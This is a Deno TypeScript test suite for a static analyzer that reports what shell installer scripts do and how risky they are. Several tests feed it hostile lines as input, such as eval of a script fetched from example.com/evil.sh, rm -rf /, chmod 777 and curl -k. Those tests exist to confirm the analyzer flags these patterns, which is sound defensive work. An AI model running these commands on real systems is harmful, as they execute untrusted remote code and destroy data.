import { assert, assertEquals, assertStringIncludes } from "@std/assert";

import { analyze } from "../../src/analyze/analyze.ts";
import { isLogWriteDestination } from "../../src/analyze/log_writes.ts";

const FIXTURE_URL = new URL("../fixtures/installer.sh", import.meta.url);
const MISE_URL = new URL("../fixtures/mise.run.sh", import.meta.url);
const ROS_URL = new URL("../fixtures/get-ros2-install.sh", import.meta.url);
const UV_URL = new URL("../fixtures/uv-install.sh", import.meta.url);
const RUSTUP_URL = new URL("../fixtures/rustup-init.sh", import.meta.url);
const NVM_URL = new URL("../fixtures/nvm-install.sh", import.meta.url);
const DOCKER_URL = new URL("../fixtures/get-docker.sh", import.meta.url);
const HOMEBREW_URL = new URL(
  "../fixtures/homebrew-install.sh",
  import.meta.url,
);

Deno.test("installer fixture extracts platforms, options, paths, and risk", async () => {
  const source = await Deno.readTextFile(FIXTURE_URL);
  const report = await analyze(source, { name: "installer.sh" });
  assertEquals(JSON.parse(JSON.stringify(report)), report);
  assertEquals(report.version, 1);
  assertEquals(report.parse.ok, true);
  assertEquals(report.parse.variant, "bash");
  assertEquals(report.source.shebang, "#!/usr/bin/env bash");
  assertEquals(report.summary.risk, "high");
  assertEquals(report.platforms.operatingSystems, [
    "darwin",
    "freebsd",
    "linux",
  ]);
  assertEquals(report.platforms.architectures, ["aarch64", "x86_64"]);
  assert(
    report.platforms.detections.some((detection) => detection.kind === "uname"),
  );
  assert(
    report.platforms.detections.some((detection) =>
      detection.kind === "case" && detection.subject.includes("OSTYPE")
    ),
  );

  const prefix = report.interface.options.find((option) =>
    option.flags.includes("--prefix")
  );
  assert(prefix);
  assertEquals(prefix.takesValue, true);
  const yes = report.interface.options.find((option) =>
    option.flags.includes("--yes")
  );
  assert(yes);
  assertEquals(yes.flags.includes("-y"), true);
  assertEquals(yes.takesValue, false);

  const env = Object.fromEntries(
    report.interface.environment.map((fact) => [fact.name, fact]),
  );
  assertEquals(env.PREFIX?.defaultValue, "/usr/local");
  assertEquals(env.PREFIX?.origin, "parameter-default");
  assertEquals(env.VERSION?.defaultValue, "1.4.0");
  assertEquals(env.SHXRAY_HOOK?.defaultValue, "");
  assertEquals(env.SHXRAY_HOOK?.origin, "parameter-default");
  assertEquals(env.OS, undefined);
  assertEquals(env.TMP, undefined);
  assertEquals(env.URL, undefined);
  assertEquals(env.SUDO, undefined);

  assert(
    report.installs.some((fact) =>
      fact.action === "install" &&
      fact.destination.includes("$PREFIX/bin/tool") &&
      fact.mode === "755"
    ),
  );
  assert(
    report.installs.some((fact) =>
      fact.action === "mkdir" && fact.destination.includes("$PREFIX/share/tool")
    ),
  );
  assert(
    report.installs.some((fact) =>
      fact.action === "append" && fact.destination.includes(".bashrc")
    ),
  );

  assert(report.privileges.some((fact) => fact.kind === "sudo"));
  assert(report.privileges.some((fact) => fact.kind === "root-check"));

  const urls = report.network.downloads.flatMap((fact) => fact.urls);
  assert(
    urls.some((url) => url.includes("example.com/tool/releases/download/")),
  );
  assert(urls.some((url) => url.includes("example.com/hook.sh")));
  assert(report.network.downloads.some((fact) => fact.tool === "curl"));
  assert(report.network.integrity.some((fact) => fact.tool === "sha256sum"));
  assert(report.network.integrity.some((fact) => fact.tool === "gpg"));

  const kinds = new Set(report.sideEffects.map((fact) => fact.kind));
  assert(kinds.has("pipe-to-shell"));
  assert(kinds.has("rm-recursive"));
  assert(kinds.has("package-manager"));
  assert(kinds.has("shell-rc"));
  assertEquals(
    report.sideEffects.find((fact) => fact.kind === "pipe-to-shell")?.severity,
    "high",
  );
  assert(
    report.notes.some((note) => note.includes("was not executed")),
  );
  assert(
    report.summary.sentences.some((sentence) =>
      sentence.includes("Installs to $PREFIX/bin/tool") &&
      sentence.includes("sudo") === false
    ),
  );
  assert(
    report.summary.sentences.some((sentence) => sentence.includes("sudo")),
  );
  const installerFlow = flatten(report.flow.steps).join("\n");
  const downloadAt = installerFlow.indexOf('Downloads "$URL"');
  const installAt = installerFlow.indexOf("installs to $PREFIX/bin/tool");
  assert(downloadAt !== -1 && installAt !== -1 && downloadAt < installAt);
  assertStringIncludes(
    installerFlow,
    "https://example.com/tool/releases/download/",
  );
  assertStringIncludes(
    installerFlow,
    "PREFIX defaults to /usr/local; override with PREFIX=... or --prefix",
  );
  const prefixInstall = report.installs.find((fact) =>
    fact.action === "install" && fact.destination.includes("$PREFIX/bin/tool")
  );
  assertEquals(prefixInstall?.controls, [
    {
      kind: "environment",
      name: "PREFIX",
      defaultValue: "/usr/local",
      defaultReason: null,
      envOverride: "PREFIX",
      assigns: null,
    },
    {
      kind: "option",
      name: "--prefix",
      defaultValue: null,
      defaultReason: "unknown default",
      envOverride: null,
      assigns: "PREFIX",
    },
  ]);
  const ja = await analyze(source, { name: "installer.sh", locale: "ja" });
  assert(
    ja.summary.sentences.some((sentence) =>
      sentence.includes("PREFIX の既定値は /usr/local") &&
      sentence.includes("上書きは PREFIX=... または --prefix")
    ),
  );
  assertEquals(report.flow.note, null);
  assert(report.flow.detailed && report.flow.detailed.length > 0);
});

Deno.test("mise excerpt keeps uname comparisons and written URLs", async () => {
  const report = await analyze(await Deno.readTextFile(MISE_URL), {
    name: "mise.run.sh",
  });
  assertEquals(report.parse.ok, true);
  assertEquals(report.platforms.operatingSystems, [
    "android",
    "darwin",
    "linux",
  ]);
  assertEquals(report.platforms.architectures, ["aarch64", "arm", "x86_64"]);
  assert(
    report.platforms.detections.some((detection) =>
      detection.kind === "test" && detection.values.includes("Darwin")
    ),
  );
  assert(
    report.platforms.detections.some((detection) =>
      detection.values.includes("arm64") &&
      detection.values.includes("aarch64") ===
        false
    ),
  );
  assert(
    report.installs.some((fact) =>
      fact.destination.includes(".local/bin/mise")
    ),
  );
  assert(
    report.installs.some((fact) => fact.destination.includes(".bashrc")),
  );
  assert(
    report.installs.every((fact) =>
      !/^(?:\$\{?stderr\}?|\/dev\/null|\/dev\/stderr)$/.test(fact.destination)
    ),
  );
  assert(
    report.network.downloads.some((fact) =>
      fact.urls.includes("https://mise.jdx.dev/releases.tsv")
    ),
  );
  const written = report.network.downloads.filter((fact) =>
    fact.references.includes('"$url"')
  );
  assert(written.length > 0);
  assert(written.every((fact) => fact.urls.length === 0));
  assert(
    report.network.downloads.every((fact) =>
      fact.urls.length > 0 || fact.references.length > 0
    ),
  );
  assert(report.flow.note?.includes("does not call"));
  assert(report.flow.note?.includes("install_mise"));
  const miseFlow = flatten(report.flow.steps).join("\n");
  assert(miseFlow.includes("Moves a file to $HOME/.local/bin/mise."));
  assert(miseFlow.includes("not called from the top level"));
});

Deno.test("get-ros2 fixture reads uname into a later case", async () => {
  const report = await analyze(await Deno.readTextFile(ROS_URL), {
    name: "get-ros2-install.sh",
  });
  assertEquals(report.parse.ok, true);
  assertEquals(report.platforms.operatingSystems, [
    "darwin",
    "linux",
    "windows",
  ]);
  assertEquals(report.platforms.architectures, ["aarch64", "x86_64"]);
  assert(
    report.network.downloads.some((fact) =>
      fact.references.includes('"$BOOTSTRAP_URL"')
    ),
  );
  assert(
    report.network.downloads.every((fact) =>
      !fact.references.includes("locales") &&
      !fact.urls.some((url) => url === "locales")
    ),
  );
  assert(
    report.installs.every((fact) =>
      !/stderr|stdout|\/dev\/null/.test(fact.destination)
    ),
  );
  assert(
    report.summary.sentences.some((sentence) => sentence.includes("apt-get")),
  );
  assert(
    report.sideEffects.some((fact) =>
      fact.kind === "package-manager" && fact.detail.includes("apt-get")
    ),
  );
  assert(
    report.installs.every((fact) =>
      !/LOG_FILE|STEP_LOG|\.log$|\/var\/log\//.test(fact.destination)
    ),
  );
  assert(
    report.summary.sentences.every((sentence) =>
      !sentence.includes("LOG_FILE") && !sentence.includes("STEP_LOG")
    ),
  );
  assert(
    report.summary.sentences.some((sentence) => sentence.includes("sudo")),
  );
  assertEquals(report.flow.entry, "main");
  const rosFlow = flatten(report.flow.steps).join("\n");
  assertStringIncludes(rosFlow, "Parses CLI options");
  assertStringIncludes(rosFlow, "updates package indexes with apt-get.");
  assertStringIncludes(rosFlow, "ros-$DISTRO-$VARIANT");
  assertStringIncludes(rosFlow, "sh -c");
  assert(!rosFlow.includes("already expanded"));
  const rosDetailed = flatten(report.flow.detailed ?? []).join("\n");
  assertStringIncludes(rosDetailed, "Calls main.");
  assertStringIncludes(rosDetailed, "not known statically");
  assertEquals(report.flow.note, null);
});

Deno.test("getopts and bracket tests are extracted", async () => {
  const report = await analyze(`
    while getopts ":hyv:" opt; do
      case "$opt" in
        v) VERSION="$OPTARG" ;;
      esac
    done
    if [ "$OSTYPE" = "linux-gnu" ]; then
      echo linux
    fi
    if [ "$EUID" -ne 0 ]; then
      echo root
    fi
  `);
  const flags = report.interface.options.map((option) => option.flags[0]);
  assertEquals(flags, ["-h", "-y", "-v"]);
  assertEquals(
    report.interface.options.find((option) => option.flags[0] === "-v")
      ?.takesValue,
    true,
  );
  assertEquals(
    report.interface.options.find((option) => option.flags[0] === "-h")
      ?.takesValue,
    false,
  );
  assertEquals(report.platforms.operatingSystems, ["linux"]);
  assert(report.privileges.some((fact) => fact.kind === "root-check"));
});

Deno.test("risky patterns keep their severity", async () => {
  const report = await analyze(`
    eval "$(curl -fsSL https://example.com/evil.sh)"
    rm -rf /
    chmod 777 /tmp/tool
    curl -k https://example.com/insecure
    bash -c "echo hi"
  `);
  const byKind = Object.fromEntries(
    report.sideEffects.map((fact) => [fact.kind, fact.severity]),
  );
  assertEquals(byKind.eval, "high");
  assertEquals(byKind["rm-recursive"], "high");
  assertEquals(byKind["chmod-permissive"], "high");
  assertEquals(byKind["insecure-download"], "medium");
  assertEquals(byKind["shell-command-string"], "medium");
  assert(
    report.network.downloads.some((fact) =>
      fact.urls.includes("https://example.com/evil.sh")
    ),
  );
  assert(
    report.network.downloads.some((fact) =>
      fact.urls.includes("https://example.com/insecure")
    ),
  );
});

Deno.test("distinct commands, flags, and url operands stay visible", async () => {
  const report = await analyze(`
    os=$(uname -s)
    [ "$os" = Linux -o "$os" = Darwin ]
    rm -r /tmp/cache; rm -rf /
    install -dm755 /opt/tool
    tee -ai "$HOME/.bashrc"
    curl -O "$url"
    curl "-o" "$file" "$kept"
    curl --url "$via_flag"
    curl --url="$via_equals"
    wget -k https://example.com/wget-k
    curl -kfSL https://example.com/bundle
    curl -H 'Referer: https://trusted.example/' https://payload.example/file
    url=https://a.example/install.sh
    url=https://b.example/install.sh
    curl "$url"
    curl https://example.com/first "$second_url"
  `);
  assertEquals(report.parse.ok, true);
  assertEquals(report.platforms.operatingSystems, ["darwin", "linux"]);
  const removals = report.sideEffects.filter((fact) =>
    fact.kind === "rm-recursive"
  );
  assertEquals(removals.length, 2);
  assert(removals.some((fact) => fact.severity === "low"));
  assert(removals.some((fact) => fact.severity === "high"));
  assertEquals(report.summary.risk, "high");
  assert(
    report.installs.some((fact) =>
      fact.action === "mkdir" && fact.destination === "/opt/tool" &&
      fact.mode === "755"
    ),
  );
  assert(
    report.installs.some((fact) =>
      fact.action === "append" && fact.destination.includes(".bashrc")
    ),
  );
  const references = report.network.downloads.flatMap((fact) =>
    fact.references
  );
  assert(references.includes('"$url"'));
  assert(references.includes('"$kept"'));
  assert(!references.includes('"$file"'));
  assert(references.includes('"$via_flag"'));
  assert(references.includes('"$via_equals"'));
  assert(references.includes('"$second_url"'));
  const urls = report.network.downloads.flatMap((fact) => fact.urls);
  assert(urls.some((url) => url.includes("example.com/wget-k")));
  assert(urls.some((url) => url.includes("example.com/bundle")));
  assert(urls.some((url) => url.includes("payload.example/file")));
  assert(urls.some((url) => url.includes("example.com/first")));
  assert(!urls.some((url) => url.includes("trusted.example")));
  assert(!urls.some((url) => url.includes("a.example")));
  assert(!urls.some((url) => url.includes("b.example")));
  const insecure = report.sideEffects.filter((fact) =>
    fact.kind === "insecure-download"
  );
  assertEquals(insecure.length, 1);
  assertStringIncludes(insecure[0]!.detail, "curl -kfSL");
});

Deno.test("defined die function is not suppressed by its name", async () => {
  const report = await analyze(`die() { rm -rf /; }; main() { die; }; main`);
  assertEquals(report.parse.ok, true);
  assert(
    report.sideEffects.some((fact) =>
      fact.kind === "rm-recursive" && fact.severity === "high"
    ),
  );
  assertStringIncludes(
    flatten(report.flow.steps).join("\n"),
    "Removes / with rm -rf.",
  );
});

Deno.test("forwarding function keeps other actions in the compact flow", async () => {
  const report = await analyze(
    `run() { rm -rf /; "$@"; }; run curl https://example.com/file`,
  );
  assertEquals(report.parse.ok, true);
  const flow = flatten(report.flow.steps).join("\n");
  const removal = flow.indexOf("Removes / with rm -rf.");
  const download = flow.indexOf(
    "Downloads https://example.com/file with curl.",
  );
  assert(removal !== -1 && download !== -1 && removal < download);
});

Deno.test("recursive condition does not overflow the flow walk", async () => {
  const report = await analyze(
    `f() { if f; then mkdir /tmp/x; fi; }; f`,
  );
  assertEquals(report.parse.ok, true);
  assert(
    report.installs.some((fact) =>
      fact.action === "mkdir" && fact.destination === "/tmp/x"
    ),
  );
  assertStringIncludes(
    flatten(report.flow.steps).join("\n"),
    "Creates /tmp/x.",
  );
});

Deno.test("archive branch collapse keeps a deletion in the same arm", async () => {
  const report = await analyze(
    `if [ "$X" = 1 ]; then tar -xf a.tar; rm -rf /; else gzip -dc a.tar | tar -xf -; fi`,
  );
  assertEquals(report.parse.ok, true);
  const flow = flatten(report.flow.steps).join("\n");
  assertStringIncludes(flow, "removes / with rm -rf.");
  assertStringIncludes(flow, "a.tar");
  assert(!flow.includes("tar (or zstd | tar)"));
});

Deno.test("positional reassignment does not keep a stale URL binding", async () => {
  const positional = await analyze(
    `url=https://safe.example/tool; url="$1"; curl "$url"`,
  );
  assertEquals(positional.parse.ok, true);
  assert(
    !flatten(positional.flow.steps).join("\n").includes("safe.example"),
  );
  assert(
    !positional.summary.sentences.join("\n").includes("safe.example"),
  );
  const cleared = await analyze(
    `url=https://safe.example/tool; url=; curl "$url"`,
  );
  assert(!flatten(cleared.flow.steps).join("\n").includes("safe.example"));
  const once = await analyze(`url=https://safe.example/tool; curl "$url"`);
  assertStringIncludes(
    flatten(once.flow.steps).join("\n"),
    "safe.example",
  );
});

Deno.test("header URL bindings are not download hosts", async () => {
  const report = await analyze(
    `referer=https://trusted.example/; curl -H "$referer" "$payload"`,
  );
  assertEquals(report.parse.ok, true);
  const summary = report.summary.sentences.join("\n");
  assert(!summary.includes("trusted.example"));
  assert(
    report.network.downloads.every((fact) =>
      !fact.urls.some((url) => url.includes("trusted.example")) &&
      !fact.references.some((ref) => ref.includes("referer"))
    ),
  );
  const direct = await analyze(
    `payload=https://payload.example/file; curl "$payload"`,
  );
  assertStringIncludes(
    direct.summary.sentences.join("\n"),
    "payload.example",
  );
});

Deno.test("checksum and signature tools are not all treated as verification", async () => {
  const digest = await analyze(`sha256sum /tmp/payload`);
  assertEquals(digest.network.integrity[0]?.verifies, false);
  assert(
    !digest.summary.sentences.some((sentence) =>
      sentence.includes("verifies integrity")
    ),
  );
  assertStringIncludes(
    digest.summary.sentences.join("\n"),
    "Runs sha256sum.",
  );
  assertStringIncludes(
    flatten(digest.flow.steps).join("\n"),
    "Runs sha256sum on /tmp/payload.",
  );

  const dearmor = await analyze(`gpg --dearmor key.asc`);
  assertEquals(dearmor.network.integrity[0]?.verifies, false);
  const dearmorText = [
    ...dearmor.summary.sentences,
    ...flatten(dearmor.flow.steps),
  ].join("\n");
  assert(!dearmorText.includes("Verifies a signature"));
  assert(!dearmorText.includes("verifies integrity"));
  assertStringIncludes(dearmorText, "Runs gpg on key.asc.");

  const checked = await analyze(`sha256sum -c sums.txt`);
  assertEquals(checked.network.integrity[0]?.verifies, true);
  assertStringIncludes(
    checked.summary.sentences.join("\n"),
    "Verifies integrity with sha256sum.",
  );
  assertStringIncludes(
    flatten(checked.flow.steps).join("\n"),
    "Checks a checksum with sha256sum on sums.txt.",
  );

  const verified = await analyze(`gpg --verify a.asc`);
  assertEquals(verified.network.integrity[0]?.verifies, true);
  assertStringIncludes(
    flatten(verified.flow.steps).join("\n"),
    "Verifies a signature with gpg on a.asc.",
  );
});

Deno.test("delegated curl -k is an insecure download", async () => {
  const report = await analyze(`run curl -k https://example.com/file`);
  assertEquals(report.parse.ok, true);
  assert(
    report.network.downloads.some((fact) =>
      fact.tool === "curl" &&
      fact.urls.includes("https://example.com/file")
    ),
  );
  assert(
    report.sideEffects.some((fact) =>
      fact.kind === "insecure-download" && fact.detail.includes("curl -k")
    ),
  );
});

Deno.test("curl --ciphers is not a download target", async () => {
  const report = await analyze(
    `curl --ciphers "$_ciphersuites" --location "$1"`,
  );
  assertEquals(report.parse.ok, true);
  const targets = report.network.downloads.flatMap((fact) => [
    ...fact.urls,
    ...fact.references,
  ]);
  assert(targets.includes('"$1"'));
  assert(!targets.some((target) => target.includes("ciphersuite")));
  const rustup = await analyze(await Deno.readTextFile(RUSTUP_URL), {
    name: "rustup-init.sh",
  });
  const rustupCurl = rustup.network.downloads.filter((fact) =>
    fact.tool === "curl"
  );
  assert(rustupCurl.length > 0);
  assert(
    rustupCurl.every((fact) =>
      ![...fact.urls, ...fact.references].some((target) =>
        target.includes("_ciphersuites")
      )
    ),
  );
});

Deno.test("wget --ciphers is not a download target", async () => {
  const report = await analyze(
    `wget --ciphers "$_ciphersuites" "$1" -O "$2"`,
  );
  assertEquals(report.parse.ok, true);
  const targets = report.network.downloads.flatMap((fact) => [
    ...fact.urls,
    ...fact.references,
  ]);
  assert(targets.includes('"$1"'));
  assert(!targets.includes('"$2"'));
  assert(!targets.some((target) => target.includes("ciphersuite")));
  const rustup = await analyze(await Deno.readTextFile(RUSTUP_URL), {
    name: "rustup-init.sh",
  });
  const rustupWget = rustup.network.downloads.filter((fact) =>
    fact.tool === "wget"
  );
  assert(rustupWget.length > 0);
  assert(
    rustupWget.every((fact) =>
      ![...fact.urls, ...fact.references].some((target) =>
        target.includes("_ciphersuites")
      )
    ),
  );
});

Deno.test("byte offsets survive non-ascii source", async () => {
  const report = await analyze(
    "# こんにちは\ncurl https://example.com/unicode-ok\n",
  );
  assertEquals(report.network.downloads[0]?.urls, [
    "https://example.com/unicode-ok",
  ]);
  assert(report.network.downloads[0]!.evidence.line >= 2);
});

Deno.test("parse errors become a report and do not throw", async () => {
  const report = await analyze("echo ok\nif true; then echo\n", {
    name: "broken.sh",
  });
  assertEquals(report.parse.ok, false);
  assert(report.parse.error);
  assertStringIncludes(report.parse.error.message, "fi");
  assertEquals(report.parse.error.line, 2);
  assertEquals(report.summary.risk, "info");
  assertEquals(report.installs, []);
});

interface StepNode {
  text: string;
  unresolved: string | null;
  children: StepNode[];
}

function flatten(steps: StepNode[]): string[] {
  const texts: string[] = [];
  for (const step of steps) {
    texts.push(step.text);
    if (step.unresolved) texts.push(step.unresolved);
    texts.push(...flatten(step.children));
  }
  return texts;
}

Deno.test("posix variant parses a portable script", async () => {
  const report = await analyze("#!/bin/sh\necho hi\n", { variant: "posix" });
  assertEquals(report.parse.ok, true);
  assertEquals(report.parse.variant, "posix");
  assertEquals(report.summary.risk, "info");
});

Deno.test("compact flow suppresses printers, collapses fallbacks, and annotates bindings", async () => {
  const script = `#!/bin/sh
set -eu
info() { echo "tool: $*"; }
debug() { if [ "\${TOOL_DEBUG:-}" = "1" ]; then echo "debug: $*"; fi; }
error() { echo "err: $*" >&2; exit 1; }

github_url() {
  echo "https://github.com/example/tool/releases/download/\$1/\$2"
}

mirror_url() {
  echo "https://mirror.example.com/\$1/\$2"
}

download_file() {
  url="\$1"
  dir="\$2"
  file="\$dir/archive"
  if command -v curl >/dev/null 2>&1; then
    debug curl -fsSL "\$url"
    curl -fsSL -o "\$file" "\$url" || return 1
  else
    if command -v wget >/dev/null 2>&1; then
      debug wget -qO "\$file" "\$url"
      stderr=\$(mktemp)
      if ! wget -O "\$file" "\$url" >"\$stderr" 2>&1; then
        rm -f "\$stderr"
        return 1
      fi
      rm "\$stderr"
    else
      error "need curl or wget"
    fi
  fi
}

get_checksum() {
  if [ "\$version" = "1.0" ]; then
    if [ "\$os" = "linux" ]; then
      if [ "\$arch" = "x64" ]; then echo "aaa"; elif [ "\$arch" = "arm64" ]; then echo "bbb"; fi
    fi
  else
    fetch_text "\$1/SHASUMS256.txt" | select_checksum "\$2"
  fi
}

install_tool() {
  install_path="\${TOOL_INSTALL_PATH:-\$HOME/.local/bin/tool}"
  install_dir="\$(dirname "\$install_path")"
  primary="\$(github_url "\$version" "tool.tar.zst")"
  backup="\$(mirror_url "\$version" "tool.tar.zst")"
  download_dir="\$(mktemp -d)"
  if ! cache_file=\$(download_file "\$primary" "\$download_dir"); then
    info "retrying mirror"
    cache_file=\$(download_file "\$backup" "\$download_dir")
  fi
  checksum="\$(get_checksum "\$base" "tool.tar.zst")"
  mkdir -p "\$install_dir"
  rm -f "\$install_path"
  if [ "\$(id -u)" = "0" ]; then
    chmod 755 "\$download_dir/tool"
  fi
  mv "\$download_dir/tool" "\$install_path"
  rm -rf "\$download_dir"
  info "installed"
}

after_finish_help() {
  case "\${SHELL:-}" in
    */zsh) info "zsh" ;;
    */bash) info "bash" ;;
    *) info "other" ;;
  esac
}

install_tool
if [ "\${TOOL_HELP-}" != 0 ]; then
  after_finish_help
fi
`;
  const report = await analyze(script, { name: "tool-install.sh" });
  assertEquals(report.parse.ok, true);
  assertEquals(report.flow.entry, "install_tool");

  // Debug logger calls must not be misclassified as downloads.
  assert(
    report.network.downloads.every((d) =>
      !d.evidence.snippet.includes("debug ")
    ),
  );

  // Summary annotates $install_path default and $install_dir dirname.
  const summaryText = report.summary.sentences.join("\n");
  assertStringIncludes(
    summaryText,
    "$install_path (install_path defaults to $HOME/.local/bin/tool; override with TOOL_INSTALL_PATH=...)",
  );
  assertStringIncludes(
    summaryText,
    "$install_dir (install_dir dirname of $install_path)",
  );

  // Compact flow is concise and readable without printer or boilerplate spam.
  const flowText = flatten(report.flow.steps).join("\n");
  assert(!flowText.includes("Calls info"));
  assert(!flowText.includes("Calls debug"));
  assert(!flowText.includes("Which path runs is not known statically."));
  assert(!flowText.includes("already expanded"));
  assertStringIncludes(flowText, "with curl or wget");
  assertStringIncludes(
    flowText,
    "https://github.com/example/tool/releases/download/",
  );
  assertStringIncludes(flowText, "On failure:");
  assertStringIncludes(flowText, "https://mirror.example.com/");
  assertStringIncludes(flowText, "selects value by");
  assertStringIncludes(
    flowText,
    "If root (id -u = 0): changes permissions on $download_dir/tool (chmod 755).",
  );
  assertStringIncludes(flowText, "Removes $download_dir with rm -rf.");
  assertStringIncludes(flowText, "[after_finish_help] Prints messages");
});

Deno.test("real-world installer fixtures parse and extract key facts offline", async () => {
  // uv
  const uv = await analyze(await Deno.readTextFile(UV_URL), {
    name: "uv-install.sh",
  });
  assertEquals(uv.parse.ok, true);
  assert(uv.platforms.operatingSystems.includes("linux"));
  assert(uv.platforms.operatingSystems.includes("darwin"));
  assert(uv.platforms.architectures.includes("x86_64"));
  assert(uv.platforms.architectures.includes("aarch64"));
  assert(uv.network.downloads.some((d) => d.tool === "curl"));
  assert(uv.network.integrity.some((i) => i.tool === "sha256sum"));
  assert(uv.installs.every((i) => !/^\$\{?[@*]\}?$/.test(i.destination)));

  // rustup
  const rustup = await analyze(await Deno.readTextFile(RUSTUP_URL), {
    name: "rustup-init.sh",
  });
  assertEquals(rustup.parse.ok, true);
  assert(rustup.platforms.operatingSystems.includes("linux"));
  assert(rustup.platforms.architectures.includes("aarch64"));
  const rustupFlow = flatten(rustup.flow.steps).join("\n");
  assertStringIncludes(rustupFlow, "[main]");
  assertStringIncludes(rustupFlow, "chmod u+x");
  assert(rustup.network.downloads.some((d) => d.tool === "curl"));

  // nvm
  const nvm = await analyze(await Deno.readTextFile(NVM_URL), {
    name: "nvm-install.sh",
  });
  assertEquals(nvm.parse.ok, true);
  assert(nvm.network.downloads.some((d) => d.tool === "curl"));
  assert(nvm.network.downloads.every((d) => d.tool !== "fetch"));
  const nvmFlow = flatten(nvm.flow.steps).join("\n");
  assertStringIncludes(nvmFlow, "nvm.sh");

  // get.docker.com
  const docker = await analyze(await Deno.readTextFile(DOCKER_URL), {
    name: "get-docker.sh",
  });
  assertEquals(docker.parse.ok, true);
  assertEquals(docker.flow.entry, "do_install");
  assert(docker.privileges.some((p) => p.kind === "sudo"));
  assert(docker.privileges.some((p) => p.kind === "su"));
  assert(
    docker.sideEffects.some((s) => s.kind === "package-manager"),
  );
  const dockerSummary = docker.summary.sentences.join("\n");
  assertStringIncludes(dockerSummary, "apt-get");
  assertStringIncludes(dockerSummary, "sudo");
  const dockerFlow = flatten(docker.flow.steps).join("\n");
  assertStringIncludes(dockerFlow, "apt-get -qq update");

  // Homebrew
  const brew = await analyze(await Deno.readTextFile(HOMEBREW_URL), {
    name: "homebrew-install.sh",
  });
  assertEquals(brew.parse.ok, true);
  assertEquals(brew.platforms.operatingSystems, ["darwin", "linux"]);
  assertEquals(brew.platforms.architectures, ["aarch64", "x86_64"]);
  assert(brew.privileges.some((p) => p.kind === "sudo"));
  assert(brew.network.downloads.every((d) => d.tool !== "fetch"));
  const brewFlow = flatten(brew.flow.steps).join("\n");
  assertStringIncludes(brewFlow, "/etc/paths.d/homebrew");
  assert(!brewFlow.includes("with fetch"));
});

Deno.test("install paths link an unknown default and a flag without guessing", async () => {
  const report = await analyze(`
    cp ./tool "$CUSTOM/bin/tool"
    DEST=$(mktemp -d)
    cp ./tool "$DEST/tool"
    case "$1" in
      --dir) TARGET="$2"; shift ;;
    esac
    cp ./tool "$TARGET/bin/tool"
  `);
  const custom = report.installs.find((fact) =>
    fact.destination === "$CUSTOM/bin/tool"
  );
  assertEquals(custom?.controls, [
    {
      kind: "environment",
      name: "CUSTOM",
      defaultValue: null,
      defaultReason: "unknown default",
      envOverride: "CUSTOM",
      assigns: null,
    },
  ]);
  assert(
    report.summary.sentences.some((sentence) =>
      sentence.includes(
        "CUSTOM unknown default; override with CUSTOM=...",
      )
    ),
  );
  const dynamic = report.installs.find((fact) =>
    fact.destination === "$DEST/tool"
  );
  assertEquals(dynamic?.controls[0]?.defaultValue, null);
  assertEquals(dynamic?.controls[0]?.defaultReason, "unknown default");
  assertEquals(dynamic?.controls[0]?.envOverride, null);
  const flagged = report.installs.find((fact) =>
    fact.destination === "$TARGET/bin/tool"
  );
  assertEquals(flagged?.controls[0]?.defaultReason, "unknown default");
  assertEquals(flagged?.controls[1], {
    kind: "option",
    name: "--dir",
    defaultValue: null,
    defaultReason: "unknown default",
    envOverride: null,
    assigns: "TARGET",
  });
  assert(
    report.summary.sentences.some((sentence) =>
      sentence.includes("TARGET unknown default; override with --dir")
    ),
  );
});

Deno.test("option values are not treated as TLS flags", async () => {
  const report = await analyze(`
    curl -o/tmp/sdk https://example.com/file
    curl -H --insecure https://example.com/header
    curl --output --insecure https://example.com/output
    curl -- --insecure
    curl -k https://example.com/insecure
    curl -kfSL https://example.com/bundle
    wget --header --no-check-certificate https://example.com/wget-header
    wget --no-check-certificate https://example.com/wget-insecure
  `);
  const insecure = report.sideEffects.filter((fact) =>
    fact.kind === "insecure-download"
  ).map((fact) => fact.detail);
  assertEquals(insecure.length, 3);
  assert(insecure.some((detail) => detail.includes("curl -k ")));
  assert(insecure.some((detail) => detail.includes("curl -kfSL")));
  assert(
    insecure.some((detail) => detail.includes("wget --no-check-certificate")),
  );
  assert(insecure.every((detail) => !detail.includes("-o/tmp/sdk")));
  assert(insecure.every((detail) => !detail.includes("-H --insecure")));
  assert(insecure.every((detail) => !detail.includes("--output --insecure")));
  assert(insecure.every((detail) => !detail.includes("curl -- --insecure")));
  assert(insecure.every((detail) => !detail.includes("wget --header")));
});

Deno.test("downloader help and version queries are not downloads", async () => {
  const onlyVersion = await analyze("curl --version\nwget --help\naria2c -v\n");
  assertEquals(onlyVersion.network.downloads, []);
  assertEquals(onlyVersion.summary.risk, "info");
  assert(
    onlyVersion.summary.sentences.every((sentence) =>
      !/download/i.test(sentence)
    ),
  );
  assertEquals(flatten(onlyVersion.flow.steps), []);

  const real = await analyze(`
    URL=https://example.com/from-config
    curl -fsSL "$URL"
    curl -v https://example.com/verbose
    curl -o --version https://example.com/filename
    wget -O "$file" https://example.com/wget
  `);
  const urls = real.network.downloads.flatMap((fact) => fact.urls);
  assert(urls.includes("https://example.com/from-config"));
  assert(urls.includes("https://example.com/verbose"));
  assert(urls.includes("https://example.com/filename"));
  assert(urls.includes("https://example.com/wget"));
  assert(
    real.network.downloads.every((fact) =>
      !fact.evidence.snippet.includes("--help")
    ),
  );
});

Deno.test("target-directory options are the install destination in both flows", async () => {
  const report = await analyze(`
    cp -t /usr/local/bin ./tool
    cp --target-directory=/opt/bin ./other
    install -t /usr/bin ./tool
    mv -t /usr/local/bin ./moved
    ln -t /usr/local/bin ./linked
    cp -t/usr/local/bin ./attached
    cp ./tool /usr/local/bin/tool
  `);
  assertEquals(
    report.installs.map((fact) => `${fact.action} ${fact.destination}`),
    [
      "copy /usr/local/bin",
      "copy /opt/bin",
      "install /usr/bin",
      "move /usr/local/bin",
      "link /usr/local/bin",
      "copy /usr/local/bin",
      "copy /usr/local/bin/tool",
    ],
  );
  const compact = flatten(report.flow.steps).join("\n");
  const detailed = flatten(report.flow.detailed ?? []).join("\n");
  for (const flow of [compact, detailed]) {
    assertStringIncludes(flow, "Copies a file to /usr/local/bin.");
    assertStringIncludes(flow, "Copies a file to /opt/bin.");
    assertStringIncludes(flow, "Installs to /usr/bin.");
    assertStringIncludes(flow, "Moves a file to /usr/local/bin.");
    assertStringIncludes(flow, "Links a file to /usr/local/bin.");
    assertStringIncludes(flow, "Copies a file to /usr/local/bin/tool.");
    assert(!flow.includes("./tool"));
    assert(!flow.includes("./other"));
    assert(!flow.includes("./moved"));
    assert(!flow.includes("./linked"));
    assert(!flow.includes("./attached"));
  }
});

